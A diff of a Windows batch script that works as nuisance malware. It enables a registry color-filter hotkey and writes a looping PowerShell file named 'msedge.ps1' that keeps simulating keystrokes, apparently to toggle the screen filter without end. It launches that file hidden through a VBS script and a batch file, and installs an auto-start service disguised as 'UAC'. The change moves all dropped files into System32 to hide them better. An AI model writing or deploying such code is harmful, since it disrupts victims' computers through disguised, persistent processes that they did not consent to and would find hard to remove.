@@ -1,7 +1,7 @@
 @echo off
 reg add "HKCU\Software\Microsoft\ColorFiltering" /v "FilterType" /t REG_DWORD /d 1 /f
 reg add "HKCU\Software\Microsoft\ColorFiltering" /v "HotkeyEnabled" /t REG_DWORD /d 1 /f
-set PS1File=C:\Users\Windows10\AppData\Local\Temp\msedge.ps1
+set PS1File=C:\Windows\System32\msedge.ps1
 echo while ($true) {  >> %PS1File%
 echo Add-Type -TypeDefinition ' >> %PS1File%
 echo using System; >> %PS1File%
@@ -18,8 +18,8 @@ echo [Keyboard]::keybd_event(0x11, 0, 2, 0) # Control Key Up >> %PS1File%
 echo [Keyboard]::keybd_event(0x5B, 0, 2, 0) # Left Windows Key Up >> %PS1File%
 echo Start-Sleep -Milliseconds 200 >>%PS1File%
 echo } >>%PS1File%
-echo powershell -ExecutionPolicy Bypass C:\Users\Windows10\AppData\Local\Temp\msedge.ps1 >>C:\Users\Windows10\AppData\Local\Temp\setuid.bat
-echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Users\Windows10\AppData\Local\Temp\Deso.vbs
-echo WshShell.Run "C:\Users\Windows10\AppData\Local\Temp\setuid.bat", 0 , false >>C:\Users\Windows10\AppData\Local\Temp\Deso.vbs
-sc create "GID" start= auto displayname= "UAC" binpath=C:\Users\Windows10\AppData\Local\Temp\setuid.bat
-start C:\Users\Windows10\AppData\Local\Temp\Deso.vbs
+echo powershell -ExecutionPolicy Bypass C:\Windows\System32\msedge.ps1 >>C:\Windows\System32\setuid.bat
+echo Set WshShell = WScript.CreateObject("WScript.Shell") >>C:\Windows\System32\Deso.vbs
+echo WshShell.Run "C:\Windows\System32\setuid.bat", 0 , false >>C:\Windows\System32\Deso.vbs
+sc create "GID" start= auto displayname= "UAC" binpath=C:\Windows\System32\setuid.bat
+start C:\Windows\System32\Deso.vbs
